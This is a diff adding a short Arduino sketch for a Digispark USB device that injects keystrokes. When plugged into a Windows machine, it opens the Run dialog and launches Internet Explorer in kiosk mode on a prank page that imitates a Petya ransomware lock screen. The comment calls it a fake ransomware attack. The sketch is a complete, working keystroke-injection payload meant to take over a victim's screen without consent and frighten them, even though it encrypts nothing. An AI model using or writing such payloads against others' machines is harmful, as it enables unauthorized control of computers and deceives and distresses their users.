@@ -1,0 +1,16 @@
+//fake ransomware attack utilizing internet explorer's kiosk mode
+
+#include "DigiKeyboard.h"
+void setup() {
+  //empty
+}
+void loop() {
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(600);
+  DigiKeyboard.print("iexplore -k https://www.cryptoprank.com/#/petya");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  for(;;){ /*empty*/ }
+}
